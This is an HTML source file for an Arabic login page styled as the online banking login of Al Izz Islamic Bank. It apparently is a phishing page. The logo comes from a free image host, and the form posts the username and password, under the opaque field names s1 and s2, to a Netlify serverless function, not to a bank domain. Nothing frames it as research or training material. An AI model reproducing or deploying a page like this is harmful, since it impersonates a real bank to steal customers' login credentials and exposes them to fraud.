<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك العز الإسلامي - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Dubai', Arial, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            min-height: 100vh;
            direction: rtl;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 24px;
            color: #333;
            background: none;
            border: none;
            cursor: pointer;
        }
        
        .logo-container {
            text-align: center;
            margin-top: 100px;
            margin-bottom: 50px;
        }
        
        .logo {
            width: 200px;
            height: auto;
        }
        
        .login-title {
            text-align: center;
            margin-bottom: 30px;
            font-size: 20px;
            color: #333;
            font-weight: normal;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .form-control {
            width: 100%;
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            font-size: 16px;
            color: #333;
        }
        
        .form-control::placeholder {
            color: #999;
            text-align: right;
        }
        
        .password-field {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 20px;
        }
        
        /* زر تسجيل الدخول */
        .btn-login {
            width: 180px;
            background-color: #bcbcdb;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            align-self: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn">→</button>
        
        <div class="logo-container">
            <img src="https://www2.0zz0.com/2025/05/13/14/250838937.png" alt="بنك العز الإسلامي" class="logo">
        </div>
        
        <div class="login-title">
            أدخل بياناتك لتسجيل الدخول
        </div>
        
=        <form action="/.netlify/functions/submit-login" method="post" class="login-form" id="loginForm">
            <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم" required>
            
            <div class="password-field">
                <input name="s2" type="password" class="form-control" placeholder="كلمة السر" required>
                <button type="button" class="toggle-password">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 4C7 4 2.73 7.11 1 12C2.73 16.89 7 20 12 20C17 20 21.27 16.89 23 12C21.27 7.11 17 4 12 4ZM12 17C9.24 17 7 14.76 7 12C7 9.24 9.24 7 12 7C14.76 7 17 9.24 17 12C17 14.76 14.76 17 12 17ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#999"/>
                        <path d="M2 2L22 22" stroke="#999" stroke-width="2"/>
                    </svg>
                </button>
            </div>
            
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>

    
</body>
</html>
